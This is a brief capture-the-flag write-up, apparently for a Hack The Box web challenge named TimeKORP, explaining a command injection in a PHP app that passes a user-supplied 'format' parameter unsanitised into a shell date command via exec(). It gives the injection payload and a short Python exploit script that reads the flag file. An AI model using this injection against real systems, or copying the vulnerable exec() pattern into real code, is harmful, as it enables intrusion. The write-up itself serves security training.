# TimeKORP

TBD

## Writeup

In the **TimeController.php** we can pass a **format** GET param:

```php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```

This param is used to inizialize the **TimeModel** object:

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
        echo $command;
    }

    public function getTime()
    {
        $time = exec($this->command);
        echo $time;
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

Inside the constructor of the class, there is a **command injection** vulnerability. So we can send this as **format** parameter:

```
?format='; cat ../flag #
```

To make the exploit working, need to URL encode the **#** mark.

The final exploit is:

```python
#!/usr/bin/python3
import requests
import re

ip = "localhost"
port = 1337

url = f"http://{ip}:{port}/"

payload = "'; cat ../flag %23"

req = requests.get(url + f"?format={payload}")

print(req.text)
```

The flag is:

```
HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}
```